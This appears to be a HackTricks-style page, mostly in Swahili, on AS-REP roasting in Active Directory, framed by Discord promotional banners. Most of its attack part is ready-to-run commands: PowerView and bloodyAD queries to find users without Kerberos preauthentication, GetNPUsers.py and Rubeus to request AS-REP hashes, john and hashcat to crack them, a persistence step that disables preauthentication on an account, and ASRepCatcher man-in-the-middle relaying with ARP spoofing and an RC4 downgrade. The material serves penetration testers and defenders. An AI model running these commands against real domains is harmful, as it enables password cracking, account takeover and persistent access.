# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa ya awali ya uthibitisho ya Kerberos**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitisho kwa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofungwa kwa kutumia ufunguo uliochukuliwa kutoka kwa nenosiri la mtumiaji, ambao washambuliaji wanaweza kujaribu kuuvunja nje ya mtandao ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulio hili ni:

- **Ukosefu wa awali ya uthibitisho ya Kerberos**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
- **Muunganisho na Domain Controller (DC)**: Washambuliaji wanahitaji ufikiaji wa DC ili kutuma maombi na kupokea ujumbe uliofungwa.
- **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahakikishe majina ya watumiaji.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting na Rubeus itazalisha 4768 yenye aina ya usimbaji 0x17 na aina ya preauth 0.

### Kupasua
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bila hati

Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapita kwenye mtandao bila kutegemea kuondolewa kwa awali ya uthibitishaji wa Kerberos. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatupa uwezo wa kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na hackers wenye uzoefu na wawindaji wa makosa!

**Mawazo ya Udukuzi**\
Shiriki na maudhui yanayoangazia msisimko na changamoto za udukuzi

**Habari za Udukuzi kwa Wakati Halisi**\
Endelea kuwa na habari kuhusu ulimwengu wa udukuzi kwa wakati halisi kupitia habari na mawazo

**Matangazo Mapya**\
Baki na habari kuhusu makosa mapya yanayoanzishwa na masasisho muhimu ya jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na uanze kushirikiana na hackers bora leo!

{{#include ../../banners/hacktricks-training.md}}
